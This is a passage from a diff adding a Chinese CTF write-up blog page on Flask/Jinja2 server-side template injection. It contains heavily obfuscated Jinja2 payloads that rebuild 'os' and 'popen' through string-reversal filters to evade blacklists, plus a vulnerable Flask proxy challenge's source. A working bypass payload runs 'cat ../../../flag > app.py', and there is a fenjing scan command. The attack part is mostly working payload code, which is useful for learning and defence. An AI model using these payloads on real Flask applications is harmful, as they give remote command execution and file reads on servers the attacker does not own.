ls=((&#123;&#125;|escape|urlencode|first+<span class="hljs-built_in">dict</span>(c=x)|join)*(yd+la))%(sbb+et+lla+pw,llla+pw,iw+bb,et+bb+pw)%&#125;&#123;%<span class="hljs-built_in">print</span> (((((((((((x,)|<span class="hljs-built_in">map</span>(at,ii)|first,)|<span class="hljs-built_in">map</span>(at,go)|first,)|<span class="hljs-built_in">map</span>(at,gi)|first)(bl),)|<span class="hljs-built_in">map</span>(at,gi)|first)(ip))(xq),)|<span class="hljs-built_in">map</span>(at,po)|first)(ls),)|<span class="hljs-built_in">map</span>(at,re)|first)()%&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> flag.txt<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">c=</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> at=dict(rtta=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> xq=dict(so=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> re=dict(daer=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> oa=&#123;&#125;<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> la=oa**oa<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lla=(la~la)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> llla=(lla~la)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lllla=(llla~la)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> yd=dict(a=x,b=x,c=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> oa=&#123;&#125;<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> la=oa**oa<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lla=(la~la)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> llla=(lla~la)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lllla=(llla~la)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> <span class="hljs-keyword">in</span>=dict(tini=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ii=()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)+<span class="hljs-keyword">in</span>+()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> gl=dict(slabolg=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> go=()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)+gl+()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ge=dict(metiteg=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> gi=()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)+ge+()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> bu=dict(snitliub=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> bl=()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)+bu+()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> im=dict(tropmi=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ip=()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)+im+()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> yt=dict(aaaaa=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> oa=&#123;&#125;<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> la=oa**oa<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lla=(la~la)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> llla=(lla~la)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lllla=(llla~la)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ob=&#123;&#125;<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lb=ob**ob<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> llb=(lb~lb)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lllb=(llb~lb)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> llllb=(lllb~lb)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> bb=llb-lb-lb-lb-lb-lb<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> sbb=lllb-llb-llb-llb-llb-llb<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ssbb=llllb-lllb-lllb-lllb-lllb-lllb<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ob=&#123;&#125;<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lb=ob**ob<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> llb=(lb~lb)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lllb=(llb~lb)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> llllb=(lllb~lb)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> bb=llb-lb-lb-lb-lb-lb<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> sbb=lllb-llb-llb-llb-llb-llb<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ssbb=llllb-lllb-lllb-lllb-lllb-lllb<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> pw=yd+la<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> iw=&#123;&#125;<span class="hljs-punctuation">|</span><span class="hljs-keyword">escape</span><span class="hljs-punctuation">|</span>list<span class="hljs-punctuation">|</span><span class="hljs-keyword">escape</span><span class="hljs-punctuation">|</span>count<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> et=iw+lla<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> po=((&#123;&#125;<span class="hljs-punctuation">|</span><span class="hljs-keyword">escape</span><span class="hljs-punctuation">|</span>urlencode<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span>+dict(c=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>)*yt)%(llla+la,llla,llla+la,sbb+et+bb+la+la,sbb+et+lla+bb)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> cf=((&#123;&#125;<span class="hljs-punctuation">|</span><span class="hljs-keyword">escape</span><span class="hljs-punctuation">|</span>urlencode<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span>+dict(c=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>)*(lla+la))%(sbb+et+bb,sbb+et+pw,llla+yt,iw+bb,sbb+et+bb+yd,sbb+et+lla+pw,sbb+et+pw,sbb+et+bb+pw,et+bb+yd,llla+yt,llla+bb+yd,llla+yt)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span> (((((((((((x,)<span class="hljs-punctuation">|</span><span class="hljs-keyword">map</span>(at,ii)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span>,)<span class="hljs-punctuation">|</span><span class="hljs-keyword">map</span>(at,go)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span>,)<span class="hljs-punctuation">|</span><span class="hljs-keyword">map</span>(at,gi)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span>)(bl),)<span class="hljs-punctuation">|</span><span class="hljs-keyword">map</span>(at,gi)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span>)(ip))(xq),)<span class="hljs-punctuation">|</span><span class="hljs-keyword">map</span>(at,po)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span>)(cf),)<span class="hljs-punctuation">|</span><span class="hljs-keyword">map</span>(at,re)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span>)()<span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>成功获得本地demo的flag</li>
+</ul>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200022125.png" srcset="/img/loading.gif" lazyload alt="image-20241220002258598"></p>
+<h3 id="2024-CCB-Safe-proxy"><a href="#2024-CCB-Safe-proxy" class="headerlink" title="2024-CCB-Safe_proxy"></a>2024-CCB-Safe_proxy</h3><p>访问页面，得到源码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template_string<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> html<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">source</span>():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>+html.escape(f.read())+<span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">template</span>():<br>    template_code = request.form.get(<span class="hljs-string">&quot;code&quot;</span>)<br>    <span class="hljs-comment"># 安全过滤</span><br>    blacklist = [<span class="hljs-string">&#x27;__&#x27;</span>, <span class="hljs-string">&#x27;import&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>]<br>    <span class="hljs-keyword">for</span> black <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> black <span class="hljs-keyword">in</span> template_code:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Forbidden content detected!&quot;</span><br>    result = render_template_string(template_code)<br>    <span class="hljs-built_in">print</span>(result)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ok&#x27;</span> <span class="hljs-keyword">if</span> result <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;error&#x27;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HTTPProxyHandler</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, target_host, target_port</span>):<br>        <span class="hljs-variable language_">self</span>.target_host = target_host<br>        <span class="hljs-variable language_">self</span>.target_port = target_port<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_request</span>(<span class="hljs-params">self, client_socket</span>):<br>        <span class="hljs-keyword">try</span>:<br>            request_data = <span class="hljs-string">b&quot;&quot;</span><br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                chunk = client_socket.recv(<span class="hljs-number">4096</span>)<br>                request_data += chunk<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(chunk) &lt; <span class="hljs-number">4096</span>:<br>                    <span class="hljs-keyword">break</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> request_data:<br>                client_socket.close()<br>                <span class="hljs-keyword">return</span><br><br>            <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> proxy_socket:<br>                proxy_socket.connect((<span class="hljs-variable language_">self</span>.target_host, <span class="hljs-variable language_">self</span>.target_port))<br>                proxy_socket.sendall(request_data)<br><br>                response_data = <span class="hljs-string">b&quot;&quot;</span><br>                <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                    chunk = proxy_socket.recv(<span class="hljs-number">4096</span>)<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> chunk:<br>                        <span class="hljs-keyword">break</span><br>                    response_data += chunk<br><br>            header_end = response_data.rfind(<span class="hljs-string">b&quot;\r\n\r\n&quot;</span>)<br>            <span class="hljs-keyword">if</span> header_end != -<span class="hljs-number">1</span>:<br>                body = response_data[header_end + <span class="hljs-number">4</span>:]<br>            <span class="hljs-keyword">else</span>:<br>                body = response_data<br>                <br>            response_body = body<br>            response = <span class="hljs-string">b&quot;HTTP/1.1 200 OK\r\n&quot;</span> \<br>                       <span class="hljs-string">b&quot;Content-Length: &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(response_body)).encode() + <span class="hljs-string">b&quot;\r\n&quot;</span> \<br>                       <span class="hljs-string">b&quot;Content-Type: text/html; charset=utf-8\r\n&quot;</span> \<br>                       <span class="hljs-string">b&quot;\r\n&quot;</span> + response_body<br><br>            client_socket.sendall(response)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Proxy Error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">finally</span>:<br>            client_socket.close()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start_proxy_server</span>(<span class="hljs-params">host, port, target_host, target_port</span>):<br>    proxy_handler = HTTPProxyHandler(target_host, target_port)<br>    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    server_socket.bind((host, port))<br>    server_socket.listen(<span class="hljs-number">100</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Proxy server is running on <span class="hljs-subst">&#123;host&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span> and forwarding to <span class="hljs-subst">&#123;target_host&#125;</span>:<span class="hljs-subst">&#123;target_port&#125;</span>...&quot;</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            client_socket, addr = server_socket.accept()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Connection from <span class="hljs-subst">&#123;addr&#125;</span>&quot;</span>)<br>            thread = threading.Thread(target=proxy_handler.handle_request, args=(client_socket,))<br>            thread.daemon = <span class="hljs-literal">True</span><br>            thread.start()<br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Shutting down proxy server...&quot;</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        server_socket.close()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_flask_app</span>():<br>    app.run(debug=<span class="hljs-literal">False</span>, host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, port=<span class="hljs-number">5000</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    proxy_host = <span class="hljs-string">&quot;0.0.0.0&quot;</span><br>    proxy_port = <span class="hljs-number">5001</span><br>    target_host = <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>    target_port = <span class="hljs-number">5000</span><br><br>    <span class="hljs-comment"># 安全反代，防止针对响应头的攻击</span><br>    proxy_thread = threading.Thread(target=start_proxy_server, args=(proxy_host, proxy_port, target_host, target_port))<br>    proxy_thread.daemon = <span class="hljs-literal">True</span><br>    proxy_thread.start()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Starting Flask app...&quot;</span>)<br>    run_flask_app()<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>Flask-SSTI</code>，形式有点像强网杯一个题目</li>
+<li>把<code>flag</code>重定向到<code>app.py</code>上</li>
+<li>绕过<code>blacklist = [&#39;__&#39;, &#39;import&#39;, &#39;os&#39;, &#39;sys&#39;, &#39;eval&#39;, &#39;subprocess&#39;, &#39;popen&#39;, &#39;system&#39;, &#39;\r&#39;, &#39;\n&#39;]</code></li>
+<li><code>__ -&gt; &#39;_&#39;+&#39;_&#39;</code></li>
+<li><code>os -&gt; &#39;o&#39;+&#39;s&#39;</code></li>
+</ul>
+<p>最终<code>payload</code>如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">code=&#123;%<span class="hljs-built_in">set</span> a=<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;globals&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> b=<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;builtins&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> c=<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;impo&#x27;</span><span class="hljs-string">&#x27;rt&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> d=<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>%&#125;&#123;&#123;cycler.<span class="hljs-built_in">next</span>[a][b][c](d)[<span class="hljs-string">&#x27;pop&#x27;</span><span class="hljs-string">&#x27;en&#x27;</span>](<span class="hljs-string">&#x27;cat ../../../flag &gt; app.py&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200029756.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<ul>
+<li>回退</li>
+</ul>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200029730.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>后续研究</strong></p>
+<p>其实可以fenjing一把嗦，但是需要修改一下代码，改成有回显的。</p>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200029578.png" srcset="/img/loading.gif" lazyload alt="40a93733048c34b153835a040397d5d"></p>
+<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">python</span> -<span class="hljs-string">m</span> <span class="hljs-string">fenjing</span> <span class="hljs-string">scan</span> <span class="hljs-built_in">--url</span> <span class="hljs-string">&quot;http://127.0.0.1:5000&quot;</span> <span class="hljs-built_in">--extra-data</span> <span class="hljs-string">&quot;code=1&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200029651.png" srcset="/img/loading.gif" lazyload alt="e55316d39cd823a891b32f1b9aad922"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SSTI-fenjing-思路总结</div>
+      <div>http://example.com/2024/12/20/SSTI-fenjing-思路总结/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>XU17</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年12月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              XU17
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
